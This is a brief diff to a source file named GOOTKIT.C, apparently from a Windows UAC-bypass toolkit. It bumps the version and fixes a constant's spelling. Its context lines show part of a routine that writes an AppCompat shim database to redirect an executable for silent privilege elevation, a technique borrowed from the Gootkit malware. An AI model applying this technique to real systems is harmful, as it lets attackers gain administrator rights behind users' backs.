@@ -5,9 +5,9 @@
 *
 *  TITLE:       GOOTKIT.C
 *
-*  VERSION:     2.70
+*  VERSION:     2.78
 *
-*  DATE:        25 Mar 2017
+*  DATE:        30 July 2017
 *
 *  Gootkit based AutoElevation using AppCompat.
 *
@@ -143,7 +143,7 @@ BOOL ucmShimRedirectEXE(
 
     RtlSecureZeroMemory(szShimDbPath, sizeof(szShimDbPath));
     _strcpy(szShimDbPath, g_ctx.szTempDirectory);
-    _strcat(szShimDbPath, MYSTERIOSCUTETHING);
+    _strcat(szShimDbPath, MYSTERIOUSCUTETHING);
     _strcat(szShimDbPath, L".sdb");
 
     hShimDb = SdbCreateDatabase(szShimDbPath, DOS_PATH);
@@ -154,7 +154,7 @@ BOOL ucmShimRedirectEXE(
     tidDB = SdbBeginWriteListTag(hShimDb, TAG_DATABASE);
     if (tidDB != TAGID_NULL) {
 
-        SdbWriteStringTag(hShimDb, TAG_NAME, MYSTERIOSCUTETHING);
+        SdbWriteStringTag(hShimDb, TAG_NAME, MYSTERIOUSCUTETHING);
         SdbWriteDWORDTag(hShimDb, TAG_OS_PLATFORM, 0x1); //win32 only RedirectEXE
         SdbWriteBinaryTag(hShimDb, TAG_DATABASE_ID, (PBYTE)&dbGUID, sizeof(GUID));
 
